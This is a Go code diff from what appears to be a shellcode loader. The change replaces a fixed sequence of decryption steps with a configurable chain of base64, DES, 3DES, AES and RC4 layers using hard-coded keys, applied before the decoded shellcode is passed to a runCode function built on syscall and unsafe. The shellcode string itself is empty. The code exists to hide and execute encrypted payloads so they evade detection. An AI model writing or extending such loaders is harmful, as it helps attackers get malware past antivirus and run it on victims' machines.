@@ -11,6 +11,7 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"strings"
 	"syscall"
 	"unsafe"
 )
@@ -103,21 +104,28 @@ func runCode(code []byte) {
 func main() {
 
 	shellcode := ""
+	encodestr := "des,rc4,aes,3des,base64"
+	slice := strings.Split(encodestr, ",")
 	//BASE64解码
 	shell, err := base64.StdEncoding.DecodeString(shellcode)
 	checkErr(err)
-	//3des解密
-	shell, _ = TripleDesDecrypt(shell, []byte("123456789012345678901234"), []byte("yoooyooq"))
-	//AES解密
-	shell = AesDecryptCBC(shell, []byte("yoolaescbcuuyool"))
-	//rc4解密
-	for i := 0; i < 1; i++ {
-		key := []byte("momohk")
-		cipher2, _ := rc4.NewCipher(key)
-		cipher2.XORKeyStream(shell, shell)
+	for i := len(slice) - 2; i > -1; i-- {
+		if strings.EqualFold(slice[i], "rc4") {
+			key := []byte("momohk")
+			cipher2, _ := rc4.NewCipher(key)
+			cipher2.XORKeyStream(shell, shell)
+		} else if strings.EqualFold(slice[i], "des") {
+			//des解密
+			shell, _ = DesDecrypt(shell, []byte("vikeryoo"))
+		} else if strings.EqualFold(slice[i], "3des") {
+			//3des解密
+			shell, _ = TripleDesDecrypt(shell, []byte("123456789012345678901234"), []byte("yoooyooq"))
+		} else if strings.EqualFold(slice[i], "aes") {
+			//AES解密
+			shell = AesDecryptCBC(shell, []byte("yoolaescbcuuyool"))
+		}
+		fmt.Println(slice[i])
 	}
-	//des解密
-	shell, _ = DesDecrypt(shell, []byte("vikeryoo"))
 
 	fmt.Println(hex.EncodeToString(shell))
 	//fmt.Println(len(os.Args))
